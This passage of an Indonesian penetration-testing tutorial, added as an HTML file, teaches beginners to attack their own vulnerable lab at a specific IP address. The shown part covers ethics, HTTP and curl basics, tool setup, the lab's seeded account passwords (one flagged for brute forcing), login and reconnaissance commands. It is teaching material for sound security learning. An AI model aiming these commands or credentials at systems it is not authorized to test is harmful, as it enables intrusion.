@@ -1,0 +1,1513 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <title>Young Owl — Panduan Membobol Lab Sendiri (Recon → Post-Exploitation)</title>
+    <style>
+      :root {
+        --ink: #1e293b; --muted: #64748b; --faint: #94a3b8; --line: #e2e8f0;
+        --cyan: #0891b2; --accent: #0e7490; --navy: #0f2742;
+        --warn-bg: #fef2f2; --warn-line: #fecaca; --warn-ink: #b91c1c;
+        --note-bg: #ecfeff; --note-line: #a5f3fc;
+        --ok-bg: #f0fdf4; --ok-line: #bbf7d0;
+        --exp-bg: #fffbeb; --exp-line: #fde68a;
+      }
+      @page { size: A4; margin: 18mm 16mm; }
+      * { box-sizing: border-box; }
+      body { font-family: 'Georgia','Times New Roman',serif; color: var(--ink); font-size: 13.9pt; line-height: 1.8; margin: 0; }
+      h1,h2,h3,h4,.sans { font-family: 'Helvetica Neue',Arial,sans-serif; }
+      code,pre { font-family: 'SFMono-Regular','Consolas','Menlo',monospace; }
+      .cover { height: 263mm; display: flex; flex-direction: column; justify-content: center;
+        page-break-after: always; background: linear-gradient(155deg,#0f2742 0%,#163659 60%,#0e4f63 100%);
+        color:#fff; margin: -17mm -15mm 0; padding: 0 24mm; }
+      .cover .owl { font-size: 54pt; }
+      .cover h1 { font-size: 27pt; margin: 8mm 0 3mm; letter-spacing: -0.5px; line-height:1.1; }
+      .cover .sub { font-size: 12.5pt; color: #7dd3fc; }
+      .cover .meta { margin-top: 12mm; font-family: 'Helvetica Neue',Arial,sans-serif; font-size: 9.5pt; color: #cbd5e1; }
+      .cover .warn { margin-top: 8mm; max-width: 140mm; font-family: 'Helvetica Neue',Arial,sans-serif;
+        font-size: 8.8pt; color: #fecaca; background: rgba(185,28,28,0.22); border: 1px solid rgba(254,202,202,0.4);
+        border-radius: 8px; padding: 5mm 6mm; line-height: 1.5; }
+      h2.chapter { font-size: 17pt; color: var(--navy); border-bottom: 2px solid var(--cyan); padding-bottom: 3mm;
+        margin: 0 0 4mm; page-break-before: always; }
+      h2.chapter .n { color: var(--cyan); font-size: 10.5pt; display: block; letter-spacing: 2px; margin-bottom: 1mm; }
+      h3 { font-size: 11.5pt; color: var(--navy); margin: 6mm 0 2mm; border-left: 3px solid var(--cyan); padding-left: 3mm; }
+      h4 { font-size: 10.2pt; color: var(--accent); margin: 4mm 0 1mm; }
+      p { margin: 0 0 3mm; }
+      ul,ol { margin: 0 0 3mm; padding-left: 6mm; }
+      li { margin-bottom: 1.4mm; }
+      strong { color: var(--navy); }
+      code { background: #eef2f7; padding: 0.4mm 1.2mm; border-radius: 3px; font-size: 10.4pt; color: var(--navy); }
+      pre { background: #0f172a; color: #e2e8f0; padding: 5mm 5.5mm; border-radius: 7px; font-size: 10pt;
+        line-height: 1.62; margin: 3.4mm 0; white-space: pre-wrap; word-break: break-word; }
+      pre code { background: none; color: inherit; padding: 0; font-size: inherit; }
+      pre .c { color: #7dd3fc; }
+      .note,.warn-box,.detect,.exp { border-radius: 8px; padding: 4.2mm 5mm; margin: 3.4mm 0;
+        font-family: 'Helvetica Neue',Arial,sans-serif; font-size: 11pt; line-height: 1.62; }
+      .note { background: var(--note-bg); border: 1px solid var(--note-line); }
+      .warn-box { background: var(--warn-bg); border: 1px solid var(--warn-line); color: var(--warn-ink); }
+      .detect { background: var(--ok-bg); border: 1px solid var(--ok-line); }
+      .exp { background: var(--exp-bg); border: 1px solid var(--exp-line); }
+      .exp b, .note b, .detect b, .warn-box b { font-family: 'Helvetica Neue',Arial,sans-serif; }
+      table { width: 100%; border-collapse: collapse; font-size: 10.6pt; margin: 3.4mm 0; font-family: 'Helvetica Neue',Arial,sans-serif; }
+      th,td { border: 1px solid var(--line); padding: 2.5mm 3mm; text-align: left; vertical-align: top; }
+      th { background: #f1f5f9; color: var(--navy); }
+      td code { font-size: 10pt; }
+      .lead { color: var(--muted); font-style: italic; margin-bottom: 4mm; }
+      .toc { page-break-after: always; }
+      .toc h2 { font-size: 16pt; color: var(--navy); border-bottom: 2px solid var(--cyan); padding-bottom: 2mm; }
+      .toc ol { font-family: 'Helvetica Neue',Arial,sans-serif; font-size: 10pt; }
+      .toc li { padding: 1.2mm 0; }
+      .toc small { color: var(--faint); display: block; }
+      .foot { color: var(--faint); font-size: 8pt; font-family: 'Helvetica Neue',Arial,sans-serif;
+        text-align: center; margin-top: 8mm; page-break-before: always; }
+    </style>
+  </head>
+  <body>
+    <section class="cover">
+      <div class="owl">🦉</div>
+      <h1>Panduan Membobol Lab Sendiri</h1>
+      <div class="sub">Reconnaissance → Vulnerability Scanning → Exploitation → Post-Exploitation,
+        termasuk Metasploit &amp; XSS — tiap perintah dijelaskan untuk pemula</div>
+      <div class="meta">Young Owl · Panduan praktik mendalam · 2026 · Target: lab Anda sendiri
+        <code>http://72.62.120.97:8080</code></div>
+      <div class="warn">
+        <b>Etika &amp; hukum.</b> Seluruh teknik di buku ini hanya untuk lab Young Owl Anda sendiri
+        (<code>http://72.62.120.97:8080</code>, <code>vulnMode=true</code>) — <b>bukan</b> control center
+        <code>https://youngowl.srv1248893.hstgr.cloud</code>, dan bukan sistem orang lain. Menyerang sistem tanpa izin
+        adalah tindak pidana (UU ITE Pasal 30–33). Bab post-exploitation/backdoor bersifat edukatif &amp; fokus deteksi.
+      </div>
+    </section>
+
+    <section class="toc">
+      <h2>Daftar Isi</h2>
+      <ol>
+        <li>Mindset, etika &amp; cara membaca perintah shell<small>Anatomi curl, flag umum, cara menyalin perintah panjang.</small></li>
+        <li>Persiapan, kredensial, verifikasi target &amp; login<small>Mengapa login wajib, menyimpan sesi, memastikan vulnMode.</small></li>
+        <li>Reconnaissance &amp; Information Gathering<small>Header, fingerprint, robots.txt, Nmap mendalam, content &amp; parameter discovery.</small></li>
+        <li>Vulnerability Scanning<small>Nikto, Nuclei, sqlmap, dan pemetaan manual per OWASP.</small></li>
+        <li>Metasploit Framework<small>Konsep, msfconsole, modul auxiliary HTTP yang relevan ke lab.</small></li>
+        <li>Exploitation per Celah (termasuk XSS)<small>SQLi, XSS, IDOR, traversal, RCE, auth, misconfig, chaining.</small></li>
+        <li>Post-Exploitation<small>Orientasi, web shell, reverse shell, persistence — di lab, lalu deteksi.</small></li>
+        <li>Deteksi, Monitoring &amp; Pelaporan<small>Signature, korelasi, dan menutup siklus.</small></li>
+        <li>Lampiran: cheat sheet, glosarium perintah &amp; checklist<small>Semua perintah + arti tiap opsi, troubleshooting, contoh laporan.</small></li>
+        <li>Panduan Perbaikan (Remediation) dengan contoh kode<small>Cara menutup tiap celah di stack Young Owl (Fastify/Prisma).</small></li>
+      </ol>
+    </section>
+
+    <!-- BAB 1 -->
+    <h2 class="chapter"><span class="n">BAB 1</span>Mindset, etika &amp; cara membaca perintah shell</h2>
+    <p class="lead">Sebelum satu perintah pun dijalankan, pahami cara kerja sebuah perintah shell. Setelah bab ini,
+      setiap baris di buku ini akan masuk akal, bukan sekadar disalin.</p>
+
+    <h3>1.1 Pola pikir seorang penyerang yang beretika</h3>
+    <p>Penetration testing adalah simulasi serangan yang <strong>sah dan terkendali</strong> untuk menemukan
+      kelemahan sebelum penyerang sungguhan melakukannya. Tiga hal membedakannya dari serangan jahat:</p>
+    <ul>
+      <li><strong>Izin</strong> — Anda hanya menyerang lab milik Anda sendiri.</li>
+      <li><strong>Dokumentasi</strong> — tiap langkah dicatat sebagai bukti.</li>
+      <li><strong>Tujuan memperbaiki</strong> — hasil akhirnya laporan &amp; perbaikan, bukan kerusakan.</li>
+    </ul>
+    <div class="warn-box"><b>Aturan tunggal.</b> Target satu-satunya adalah <code>http://72.62.120.97:8080</code>.
+      Jangan pernah mengarahkan perintah ini ke host lain.</div>
+    <h4>Dasar hukum (Indonesia)</h4>
+    <p>Mengakses sistem orang lain tanpa izin adalah tindak pidana. Ketentuan utama di UU ITE:</p>
+    <table>
+      <tr><th>Pasal</th><th>Larangan</th></tr>
+      <tr><td>Pasal 30</td><td>Mengakses komputer/sistem milik orang lain tanpa hak (dengan cara apa pun).</td></tr>
+      <tr><td>Pasal 31</td><td>Intersepsi/penyadapan informasi tanpa hak.</td></tr>
+      <tr><td>Pasal 32</td><td>Mengubah, menambah, menghapus, merusak data tanpa hak.</td></tr>
+      <tr><td>Pasal 33</td><td>Mengganggu sistem hingga tidak bekerja sebagaimana mestinya (mis. DoS).</td></tr>
+    </table>
+    <div class="note"><b>Intinya:</b> yang membuat aktivitas di buku ini sah adalah <b>izin</b> — lab milik Anda sendiri,
+      terisolasi. Begitu diarahkan ke sistem lain, teknik yang sama menjadi pelanggaran pidana. Simpan bukti bahwa
+      target memang milik/di bawah kendali Anda.</div>
+
+    <h3>1.2 Anatomi perintah <code>curl</code></h3>
+    <p>Sebagian besar serangan di buku ini memakai <code>curl</code> — program pengirim request HTTP dari terminal.
+      Mari bedah satu perintah lengkap:</p>
+    <pre><code>curl -s -b cookies.txt -X POST "URL" -H 'content-type: application/json' -d 'BODY'</code></pre>
+    <table>
+      <tr><th>Bagian</th><th>Arti &amp; kapan dipakai</th></tr>
+      <tr><td><code>curl</code></td><td>Program untuk mengirim request HTTP (GET, POST, dll.) dari terminal.</td></tr>
+      <tr><td><code>-s</code></td><td><i>silent</i>: sembunyikan bar progres; tampilkan hanya isi respons. Membuat output bersih untuk dibaca atau disalurkan ke <code>jq</code>.</td></tr>
+      <tr><td><code>-b cookies.txt</code></td><td><i>bisikan cookie</i>: kirim cookie dari berkas <code>cookies.txt</code>. Inilah yang membuat request "dikenali" sebagai sudah login.</td></tr>
+      <tr><td><code>-c cookies.txt</code></td><td><i>cookie jar</i>: <b>simpan</b> cookie yang diberikan server ke berkas itu. Dipakai saat login.</td></tr>
+      <tr><td><code>-X POST</code></td><td>Pilih metode HTTP. GET = mengambil data; POST = mengirim data (login, membuat sesuatu).</td></tr>
+      <tr><td><code>"URL"</code></td><td>Alamat endpoint tujuan. Selalu dalam tanda kutip agar karakter khusus aman.</td></tr>
+      <tr><td><code>-H 'header: nilai'</code></td><td>Tambah header. <code>content-type: application/json</code> memberi tahu server "body saya berformat JSON".</td></tr>
+      <tr><td><code>-d 'BODY'</code></td><td><i>data</i>: isi yang dikirim (mis. JSON <code>{"email":...}</code>). Memakai <code>-d</code> otomatis membuat metode jadi POST bila <code>-X</code> tak diberi.</td></tr>
+    </table>
+    <h4>Flag tambahan yang sering muncul</h4>
+    <table>
+      <tr><th>Flag</th><th>Arti</th></tr>
+      <tr><td><code>-I</code></td><td>Minta <i>hanya header</i> respons (tanpa body). Cepat untuk fingerprint server.</td></tr>
+      <tr><td><code>-G</code></td><td>Paksa metode GET dan tempelkan data dari <code>--data-urlencode</code> ke URL sebagai query string.</td></tr>
+      <tr><td><code>--data-urlencode "k=v"</code></td><td>Kirim parameter <code>k</code> dengan nilai <code>v</code> yang di-encode aman (spasi, kutip, simbol tak merusak URL).</td></tr>
+      <tr><td><code>-L</code></td><td>Ikuti redirect (3xx) ke lokasi barunya secara otomatis.</td></tr>
+      <tr><td><code>-o berkas</code> / <code>-O</code></td><td>Simpan respons ke berkas (nama Anda / nama dari URL).</td></tr>
+      <tr><td><code>-w '%{http_code}'</code></td><td>Cetak metrik setelah selesai, mis. kode status HTTP.</td></tr>
+      <tr><td><code>-k</code></td><td>Abaikan verifikasi sertifikat TLS (untuk HTTPS self-signed). Tak perlu untuk lab di HTTP.</td></tr>
+      <tr><td><code>| jq</code></td><td>Salurkan output ke program <code>jq</code> agar JSON tampil rapi &amp; berwarna, serta bisa disaring.</td></tr>
+    </table>
+    <div class="note"><b>Tanda <code>\</code> di akhir baris</b> berarti "perintah bersambung ke baris berikut".
+      Anda boleh menyalin seluruh blok sekaligus; shell menganggapnya satu perintah utuh.</div>
+
+    <h3>1.3 Jebakan tanda kutip (penting!)</h3>
+    <p>Di shell, <strong>tanda kutip tunggal di dalam string kutip-tunggal akan memutus string itu</strong>. Jadi
+      bila body <code>-d '...'</code> (dibungkus kutip tunggal) berisi kutip tunggal lagi di dalamnya, JSON jadi rusak
+      dan server membalas <code>"Body is not valid JSON"</code>.</p>
+    <div class="exp"><b>Aturan aman:</b> (1) hindari kutip tunggal di dalam payload; pakai nilai tanpa kutip bila bisa.
+      (2) Bila butuh teks ber-kutip, simpan body ke berkas lalu kirim dengan <code>-d @body.json</code> — tak akan
+      pernah ada masalah kutip. Kedua cara ini dipakai di bab XSS (BAB 6.2).</div>
+
+    <h3>1.4 Alat lain yang dipakai</h3>
+    <table>
+      <tr><th>Alat</th><th>Fungsi singkat</th></tr>
+      <tr><td><code>jq</code></td><td>Memformat &amp; menyaring JSON (output API).</td></tr>
+      <tr><td><code>nmap</code></td><td>Memetakan port &amp; versi layanan.</td></tr>
+      <tr><td><code>whatweb</code>, <code>wafw00f</code></td><td>Fingerprint teknologi &amp; deteksi WAF.</td></tr>
+      <tr><td><code>ffuf</code>, <code>gobuster</code></td><td>Menemukan endpoint/direktori tersembunyi (fuzzing).</td></tr>
+      <tr><td><code>nikto</code>, <code>nuclei</code></td><td>Pemindai web otomatis.</td></tr>
+      <tr><td><code>sqlmap</code></td><td>Otomasi SQL injection.</td></tr>
+      <tr><td><code>hydra</code></td><td>Uji kredensial (brute force).</td></tr>
+      <tr><td><code>msfconsole</code> (Metasploit)</td><td>Kerangka modul recon/exploit (BAB 5).</td></tr>
+    </table>
+
+    <h3>1.4b Dasar <code>jq</code> — membaca JSON</h3>
+    <p>API Young Owl membalas JSON. <code>jq</code> membuatnya rapi &amp; bisa disaring. Beberapa pola yang akan sering
+      dipakai:</p>
+    <table>
+      <tr><th>Perintah</th><th>Hasil</th></tr>
+      <tr><td><code>... | jq</code></td><td>Tampilkan seluruh JSON, rapi &amp; berwarna.</td></tr>
+      <tr><td><code>... | jq '.data'</code></td><td>Ambil hanya field <code>data</code>.</td></tr>
+      <tr><td><code>... | jq '.data[0].email'</code></td><td>Elemen pertama array <code>data</code>, field <code>email</code>.</td></tr>
+      <tr><td><code>... | jq -r '.flag'</code></td><td><code>-r</code> (<i>raw</i>): cetak nilai tanpa tanda kutip — enak untuk flag.</td></tr>
+      <tr><td><code>... | jq 'keys'</code></td><td>Daftar nama field — berguna saat belum tahu bentuk respons.</td></tr>
+      <tr><td><code>... | jq '.[] | .id'</code></td><td>Ambil <code>id</code> dari setiap elemen array.</td></tr>
+    </table>
+    <div class="exp"><b>Penjelasan:</b> titik <code>.</code> adalah "JSON saat ini"; <code>.field</code> masuk ke field;
+      <code>[n]</code> memilih elemen array ke-n; <code>[]</code> berarti "setiap elemen". Jika <code>jq</code> error
+      "Cannot index...", berarti bentuk respons berbeda — mulai dari <code>jq</code> (tanpa filter) untuk melihat
+      strukturnya dulu.</div>
+
+    <h3>1.5 Dasar HTTP yang wajib dipahami</h3>
+    <p>Semua serangan web adalah percakapan HTTP: Anda mengirim <b>request</b>, server membalas <b>response</b>.
+      Memahami bentuknya membuat setiap serangan masuk akal.</p>
+    <h4>Bentuk sebuah request</h4>
+    <pre><code>POST /api/v1/auth/login HTTP/1.1        <span class="c">&lt;- baris: metode, path, versi</span>
+Host: 72.62.120.97:8080                 <span class="c">&lt;- header: tujuan</span>
+Content-Type: application/json          <span class="c">&lt;- header: format body</span>
+Cookie: sid=abc123                      <span class="c">&lt;- header: sesi login</span>
+                                        <span class="c">&lt;- baris kosong memisah header &amp; body</span>
+{"email":"intern@youngowl.lab","password":"sunshine"}   <span class="c">&lt;- body</span></code></pre>
+    <div class="exp"><b>Penjelasan:</b> saat Anda menulis <code>curl -X POST ... -H '...' -d '...'</code>, Anda sebenarnya
+      menyusun pesan di atas. <code>-X</code> = metode, <code>-H</code> = baris header, <code>-d</code> = body,
+      <code>-b</code> = header Cookie. Jadi curl bukan "sihir" — ia hanya mengetik HTTP untuk Anda.</div>
+    <h4>Metode HTTP yang sering dipakai</h4>
+    <table>
+      <tr><th>Metode</th><th>Maksud</th><th>Contoh di lab</th></tr>
+      <tr><td><code>GET</code></td><td>Mengambil data (tak mengubah).</td><td><code>/targets/search?q=</code></td></tr>
+      <tr><td><code>POST</code></td><td>Mengirim/membuat data.</td><td><code>/auth/login</code>, <code>/tools/lookup</code></td></tr>
+      <tr><td><code>PUT</code>/<code>PATCH</code></td><td>Mengubah data yang ada.</td><td>update assessment</td></tr>
+      <tr><td><code>DELETE</code></td><td>Menghapus data.</td><td>hapus vulnerability</td></tr>
+      <tr><td><code>OPTIONS</code></td><td>Tanya metode apa yang diizinkan.</td><td>probe CORS/metode</td></tr>
+    </table>
+    <h4>Kode status respons</h4>
+    <table>
+      <tr><th>Kode</th><th>Arti</th><th>Kenapa penting bagi penyerang</th></tr>
+      <tr><td><code>200</code></td><td>OK/berhasil.</td><td>Request diterima; lihat body-nya.</td></tr>
+      <tr><td><code>301/302</code></td><td>Redirect.</td><td>Ada halaman lain; pakai <code>-L</code> untuk ikut.</td></tr>
+      <tr><td><code>400</code></td><td>Request salah bentuk.</td><td>Mis. <code>Body is not valid JSON</code> (jebakan kutip).</td></tr>
+      <tr><td><code>401</code></td><td>Belum login.</td><td>Endpoint ada tapi butuh sesi — login dulu.</td></tr>
+      <tr><td><code>403</code></td><td>Dilarang.</td><td>Ada tapi akun Anda tak berhak — target IDOR?</td></tr>
+      <tr><td><code>404</code></td><td>Tak ditemukan.</td><td>Path salah; di fuzzing = "bukan endpoint".</td></tr>
+      <tr><td><code>500</code></td><td>Error server.</td><td>Sering tanda injeksi berhasil memecah query.</td></tr>
+    </table>
+
+    <h3>1.6 Burp Suite — mengintip &amp; mengulang request</h3>
+    <p>Selain <code>curl</code>, alat kedua paling berguna adalah <b>Burp Suite</b>: proxy yang duduk di antara peramban
+      dan server, sehingga Anda bisa melihat &amp; mengubah tiap request. Alur dasarnya:</p>
+    <table>
+      <tr><th>Fitur Burp</th><th>Gunanya</th></tr>
+      <tr><td><b>Proxy &gt; Intercept</b></td><td>Tahan request dari peramban untuk dilihat/ubah sebelum dikirim.</td></tr>
+      <tr><td><b>HTTP history</b></td><td>Daftar semua request yang lewat — cara menemukan endpoint tersembunyi tanpa menebak.</td></tr>
+      <tr><td><b>Repeater</b></td><td>Kirim ulang satu request berkali-kali sambil mengubah sedikit — ideal untuk menguji SQLi/XSS manual.</td></tr>
+      <tr><td><b>Intruder</b></td><td>Otomatiskan variasi (mis. coba banyak id untuk IDOR, banyak payload untuk SQLi).</td></tr>
+      <tr><td><b>Decoder</b></td><td>Encode/decode URL, Base64, dll. — berguna menyiapkan payload.</td></tr>
+    </table>
+    <div class="exp"><b>Cara memakai untuk lab:</b> arahkan peramban ke proxy Burp (biasanya <code>127.0.0.1:8080</code> —
+      hati-hati, ini port Burp di mesin Anda, berbeda dari port 8080 lab di <code>72.62.120.97</code>), buka
+      aplikasi lab, lalu lihat request di HTTP history. Klik kanan request login → <i>Send to Repeater</i>, ubah
+      parameter, tekan <i>Send</i>, amati respons. Ini "curl dengan tombol" yang lebih cepat untuk eksperimen.</div>
+    <div class="note"><b>curl vs Burp:</b> keduanya mengirim HTTP yang sama. Buku ini menulis contoh dalam
+      <code>curl</code> karena bisa disalin apa adanya &amp; masuk laporan; kapan pun Anda lebih suka klik, gunakan
+      Repeater dengan isi yang sama.</div>
+
+    <h3>1.7 Menyiapkan lingkungan (Kali Linux)</h3>
+    <p>Kali Linux sudah membawa hampir semua alat di buku ini. Sebelum mulai, pastikan tersedia &amp; terbaru:</p>
+    <pre><code>which curl jq nmap whatweb wafw00f ffuf gobuster nikto nuclei sqlmap hydra msfconsole
+sudo apt update &amp;&amp; sudo apt -y install ffuf seclists  <span class="c"># bila ada yang kurang</span>
+nuclei -update-templates                                 <span class="c"># segarkan template nuclei</span>
+ls /usr/share/wordlists/rockyou.txt* /usr/share/seclists <span class="c"># pastikan wordlist ada</span></code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>which ...</code> mencetak lokasi tiap program bila terpasang (kosong =
+      belum ada). <code>apt install</code> memasang yang kurang. <code>rockyou.txt</code> kadang masih
+      ter-kompresi <code>.gz</code> — buka dengan <code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code>.</div>
+    <div class="warn-box"><b>Konektivitas:</b> pastikan Kali Anda bisa menjangkau <code>72.62.120.97:8080</code>
+      (<code>curl -s http://72.62.120.97:8080/api/v1/system/health</code> harus membalas). Lab sengaja mem-block
+      egress <i>keluar</i>, tetapi menerima koneksi masuk ke port 8080.</div>
+
+    <h3>1.8 Rules of Engagement &amp; metodologi</h3>
+    <p>Sebelum pentest sungguhan, ada kesepakatan tertulis bernama <b>Rules of Engagement (RoE)</b>. Walau ini lab
+      pribadi, biasakan menuliskannya — kebiasaan ini yang membedakan profesional dari sekadar iseng.</p>
+    <table>
+      <tr><th>Butir RoE</th><th>Isi untuk lab Anda</th></tr>
+      <tr><td>Target (scope)</td><td>Hanya <code>http://72.62.120.97:8080</code>.</td></tr>
+      <tr><td>Di luar scope</td><td>Control center, host lain, jaringan sekitar — dilarang.</td></tr>
+      <tr><td>Jendela waktu</td><td>Kapan pun (lab milik sendiri), catat tanggal tiap sesi.</td></tr>
+      <tr><td>Tindakan terlarang</td><td>Menghapus data permanen, DoS, menanam malware nyata.</td></tr>
+      <tr><td>Penanganan data</td><td>Flag &amp; data uji tidak disebar ke luar.</td></tr>
+      <tr><td>Kontak darurat</td><td>Anda sendiri; tahu cara reset lab bila rusak.</td></tr>
+    </table>
+    <h4>Metodologi standar (yang buku ini ikuti)</h4>
+    <p>Kebanyakan pentest mengikuti kerangka seperti PTES/OWASP: <b>(1)</b> Pengintaian →
+      <b>(2)</b> Pemindaian &amp; pemetaan → <b>(3)</b> Mendapatkan akses (eksploitasi) →
+      <b>(4)</b> Mempertahankan akses (post-exploitation) → <b>(5)</b> Analisis &amp; pelaporan. Bab 3–8 buku ini
+      memetakan persis ke lima tahap ini, agar alur kerja Anda terstruktur dan bisa diaudit.</p>
+    <div class="exp"><b>Mengapa struktur penting:</b> tanpa metode, pemula "menembak acak". Dengan metode, tiap temuan
+      punya tempat, tiap langkah punya bukti, dan laporan akhir menulis dirinya sendiri dari catatan Anda.</div>
+
+    <!-- BAB 2 -->
+    <h2 class="chapter"><span class="n">BAB 2</span>Persiapan, kredensial, verifikasi target &amp; login</h2>
+    <p class="lead">Penyebab nomor satu "perintah tidak jalan" adalah lupa login. Bab ini memastikan fondasi Anda benar.</p>
+
+    <h3>2.1 Konstanta target</h3>
+    <table>
+      <tr><th>Nilai</th><th>Isi</th></tr>
+      <tr><td>Base URL lab (SERANG ini)</td><td><code>http://72.62.120.97:8080</code></td></tr>
+      <tr><td>IP (untuk Nmap/Metasploit)</td><td><code>72.62.120.97</code>, port <code>8080</code></td></tr>
+      <tr><td>Control center (JANGAN diserang)</td><td><code>https://youngowl.srv1248893.hstgr.cloud</code></td></tr>
+    </table>
+    <div class="warn-box"><b>Kenapa bukan subdomain?</b> Subdomain itu salinan <i>aman</i> (<code>VULN_MODE=false</code>):
+      tidak ada celah tertanam, memakai database asli Anda. Menyerangnya sia-sia dan hanya membebani aplikasi nyata.</div>
+
+    <h3>2.2 Akun bawaan lab</h3>
+    <table>
+      <tr><th>Email</th><th>Password default*</th><th>Peran</th></tr>
+      <tr><td><code>admin@youngowl.lab</code></td><td><code>Owl-Admin-2026!</code></td><td>Admin</td></tr>
+      <tr><td><code>researcher@youngowl.lab</code></td><td><code>Owl-Research-2026!</code></td><td>Researcher</td></tr>
+      <tr><td><code>student@youngowl.lab</code></td><td><code>Owl-Student-2026!</code></td><td>Student</td></tr>
+      <tr><td><code>intern@youngowl.lab</code></td><td><code>sunshine</code></td><td>Target brute-force (BAB 6.6)</td></tr>
+    </table>
+    <div class="note">*Diambil dari <code>SEED_*_PASSWORD</code> di <code>.env</code>. Bila sudah Anda ubah, pakai nilai Anda.
+      Password <code>intern</code> sengaja lemah (ada di <code>rockyou.txt</code>).</div>
+
+    <h3>2.2b Mengapa menyerang lab ini aman</h3>
+    <p>Anda bebas "membobol" tanpa risiko karena lab dirancang terisolasi &amp; mudah dipulihkan:</p>
+    <table>
+      <tr><th>Mekanisme</th><th>Fungsinya</th></tr>
+      <tr><td>Database dummy (tmpfs)</td><td>Data hanya di memori; restart = bersih. Bukan data asli Anda.</td></tr>
+      <tr><td>Egress diblokir (<code>firewall.sh</code>)</td><td>Kalaupun ada RCE, server tak bisa "menelepon keluar" — reverse shell gagal terhubung.</td></tr>
+      <tr><td>Auto-reset berkala</td><td>Flag &amp; data dipulihkan otomatis; kerusakan tidak permanen.</td></tr>
+      <tr><td>Batas CPU/RAM</td><td>Scanner agresif tak akan menjatuhkan mesin host.</td></tr>
+      <tr><td>Terpisah dari copy aman</td><td>Serangan tak menyentuh instance produksi/notes Anda.</td></tr>
+    </table>
+    <div class="exp"><b>Penjelasan:</b> inilah alasan buku ini boleh memberi perintah serangan sungguhan. Di luar lab,
+      mekanisme yang sama justru menjadi <i>pertahanan</i> yang Anda rekomendasikan: isolasi jaringan, blokir egress,
+      dan kemampuan pulih cepat.</div>
+
+    <h3>2.3 Verifikasi target</h3>
+    <pre><code>curl -s http://72.62.120.97:8080/api/v1/system/health | jq</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>curl -s</code> ambil data senyap; <code>| jq</code> merapikan JSON.
+      <b>Harus muncul</b> <code>"vulnMode": true</code>. Jika tidak, Anda menyentuh salinan aman — berhenti.</div>
+
+    <h3>2.4 Login &amp; simpan sesi — WAJIB</h3>
+    <pre><code>curl -s -c cookies.txt -X POST "http://72.62.120.97:8080/api/v1/auth/login" \
+  -H 'content-type: application/json' \
+  -d '{"email":"intern@youngowl.lab","password":"sunshine"}'</code></pre>
+    <div class="exp"><b>Penjelasan per bagian:</b>
+      <ul style="margin:1mm 0 0">
+        <li><code>-c cookies.txt</code> — simpan cookie sesi yang diberi server. Inilah "tiket masuk" Anda.</li>
+        <li><code>-X POST</code> — login mengirim data, jadi POST.</li>
+        <li><code>-H 'content-type: application/json'</code> — body saya JSON.</li>
+        <li><code>-d '{...}'</code> — kredensial. Ganti password bila sudah diubah.</li>
+      </ul>
+    </div>
+    <div class="warn-box"><b>Membaca respons login:</b> <code>"Wrong password for this account."</code> = email benar,
+      password salah (ini sendiri celah enumerasi). <code>"No account uses that email."</code> = email salah ketik.
+      Jika sukses, server mengeset cookie dan <code>cookies.txt</code> terisi.</div>
+
+    <h3>2.5 Pastikan sesi aktif</h3>
+    <pre><code>curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/assessments" | jq</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>-b cookies.txt</code> mengirim cookie tadi. Jika Anda mendapat daftar
+      assessment (bukan <code>UNAUTHENTICATED</code>), sesi aktif. <b>Catat satu <code>id</code> assessment milik
+      Anda</b> — dipakai untuk XSS (BAB 6.2).</div>
+
+    <!-- BAB 3 -->
+    <h2 class="chapter"><span class="n">BAB 3</span>Reconnaissance &amp; Information Gathering</h2>
+    <p class="lead">Reconnaissance = mengenali target sebelum menyerang. Tujuannya menjawab: server apa, teknologi apa,
+      endpoint apa yang ada, parameter apa yang diterima. Makin lengkap peta ini, makin terarah serangan Anda.</p>
+
+    <h3>3.1 Fingerprint cepat dengan header respons</h3>
+    <pre><code>curl -sI http://72.62.120.97:8080/</code></pre>
+    <div class="exp"><b>Penjelasan tiap bagian:</b>
+      <ul style="margin:1mm 0 0">
+        <li><code>curl</code> — kirim request HTTP.</li>
+        <li><code>-s</code> — <i>silent</i>, sembunyikan bar progres agar output bersih.</li>
+        <li><code>-I</code> — <i>head only</i>: minta <b>hanya header</b>, bukan isi halaman. Cepat dan hemat.</li>
+        <li><code>http://72.62.120.97:8080/</code> — akar (root) aplikasi lab Anda.</li>
+      </ul>
+      <b>Yang dicari:</b> baris <code>Server:</code>, <code>X-Powered-By:</code>, dan header keamanan yang
+      <i>hilang</i> (mis. tidak ada <code>Content-Security-Policy</code>) — ketiadaan ini sendiri sebuah temuan.</div>
+
+    <h4>Header keamanan yang harus dicari</h4>
+    <table>
+      <tr><th>Header</th><th>Bila ada</th><th>Bila hilang</th></tr>
+      <tr><td><code>Content-Security-Policy</code></td><td>Membatasi sumber skrip (rem XSS).</td><td>XSS lebih mudah berhasil.</td></tr>
+      <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>Cegah tebakan tipe konten.</td><td>Risiko MIME sniffing.</td></tr>
+      <tr><td><code>Strict-Transport-Security</code></td><td>Paksa HTTPS.</td><td>Rentan downgrade (di HTTP lab, wajar kosong).</td></tr>
+      <tr><td><code>Set-Cookie: ...HttpOnly</code></td><td>JS tak bisa baca cookie.</td><td>Cookie bisa dicuri via XSS.</td></tr>
+    </table>
+    <div class="note"><b>Catat ketiadaannya:</b> header keamanan yang hilang adalah temuan "misconfiguration" tersendiri
+      — masukkan ke laporan meski tak langsung menghasilkan flag.</div>
+
+    <h3>3.1b Passive recon (tanpa menyentuh target)</h3>
+    <p>Sebelum mengirim satu paket pun, penyerang mengumpulkan info dari sumber publik (OSINT): DNS, sertifikat,
+      mesin pencari, repositori kode. Untuk lab pribadi ini porsinya kecil, tapi kebiasaannya penting.</p>
+    <pre><code>dig +short 72.62.120.97        <span class="c"># info DNS balik (bila ada)</span>
+curl -s http://72.62.120.97:8080/ -o /dev/null -w '%{http_code} %{content_type}\n'</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>dig</code> menanyakan DNS. Baris <code>curl</code> kedua mencetak kode status
+      &amp; tipe konten tanpa menampilkan isi (<code>-o /dev/null</code>) — cara ultra-ringan "mengetuk" target. Passive
+      recon mengurangi kebisingan sebelum tahap aktif.</div>
+
+    <h3>3.2 Identifikasi teknologi: <code>whatweb</code></h3>
+    <pre><code>whatweb -a 3 http://72.62.120.97:8080</code></pre>
